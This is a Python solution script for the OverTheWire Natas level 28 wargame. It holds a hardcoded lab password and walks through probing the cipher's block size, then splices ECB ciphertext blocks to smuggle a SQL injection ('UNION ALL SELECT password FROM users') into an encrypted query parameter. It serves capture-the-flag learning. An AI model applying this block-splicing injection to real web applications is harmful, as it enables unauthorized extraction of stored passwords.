import requests
import re
import base64
from urllib import parse

user = 'natas28'
passw = 'JWwR438wkgTsNKBbcJoowyysdM82YjeF'
url = 'http://%s.natas.labs.overthewire.org/' % user


session = requests.Session()

# 1st step:  print the sourcecode
'''
response = session.get(url, auth=(user, passw))
print(response.text)
print(response.cookies)
'''
# seems like we are querying from a database, let's go for SQL again



# 2nd step: discovering how the functionality
'''
response = session.post(url, auth=(user, passw), data={'query':'a'*12, 'submit':'submit'})
response_url = response.url
# print(response.text)
# print(response_url)
# print(parse.parse_qs(parse.urlparse(response_url).query))
print(base64.b64decode(parse.parse_qs(parse.urlparse(response_url).query)['query'][0]))
print((base64.b64decode(parse.parse_qs(parse.urlparse(response_url).query)['query'][0])).hex()) 
'''


# 3rd step: messing with the query variable with url injection
'''
response = session.post(url, auth=(user, passw), data={'query':'what', 'submit':'submit'})
response_url = response.url
responseLength = len(response.text)
variable = parse.parse_qs(parse.urlparse(response_url).query)['query'][0]
for x in range(len(variable)):
    trial = variable[:x]
    response2 = session.get(url + 'search.php/?query=' + trial, auth=(user, passw))
    print(response2.text)
'''






# 4th step: trying to figure out the block size
'''
# for x in range(1, 150):
    # response = session.post(url, auth=(user, passw), data={'query':'A' * x, 'submit':'submit'})
    # print(x, len((base64.b64decode(parse.parse_qs(parse.urlparse(response.url).query)['query'][0])).hex()))
'''


# 5th step: messing with blocks
# for x in range(1, 47):
#     response = session.post(url, auth=(user, passw), data={'query':'A' * x, 'submit':'submit'})
#     print("--------------------")
#     print("***", x, " A's ***")
#     blocks = (base64.b64decode(parse.parse_qs(parse.urlparse(response.url).query)['query'][0])).hex()
#     for j in range( len(blocks) // 32):
#         block = blocks[ (j * 32) : (32 * j + 32) ]
#         print(block)
#     print(" ")




# 6th step: going back to the 12 A's... at 13 A's, it will create a new block
# specialChars = ['A', '\'', '"', '\\', '/', '#', '?', '%']
# for char in specialChars:
#     response = session.post(url, auth=(user, passw), data={'query':'A' * 11 + char, 'submit':'submit'})
#     print(char, ':', len((base64.b64decode(parse.parse_qs(parse.urlparse(response.url).query)['query'][0])).hex()))


# 7th step: going back to the 10 A's
response = session.post(url, auth=(user, passw), data={'query':'A' * 25 + '\' UNION ALL SELECT password FROM users; # -- ', 'submit':'submit'})  # 9-25-41... will work
malicious = (base64.b64decode(parse.parse_qs(parse.urlparse(response.url).query)['query'][0])).hex()

response = session.post(url, auth=(user, passw), data={'query':'A' * 26, 'submit':'submit'})  # 10-26-42... will work
clean = (base64.b64decode(parse.parse_qs(parse.urlparse(response.url).query)['query'][0])).hex()

crafted = clean[: (4 * 32)]  # starting from 3, add 1 per 16 block, it's 4 cause we have used 26
crafted += malicious[ (4 * 32) : ] # starting from 3, add 1 per 16 block, it's 4 cause we have used 25

print(crafted)

payload = parse.quote(base64.b64encode(bytearray.fromhex(crafted)).decode('utf-8'))



response = session.get(url + 'search.php/?query=' + payload, auth=(user, passw))
webPage = response.text
# print(webPage)
# matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, webPage)  # we know that the password has length of 32 chars and consisting of alphanum
# # the first part of the regular expression is for not to match with our previous password, since it's also present in the sourcecode
# print(matchObject.group())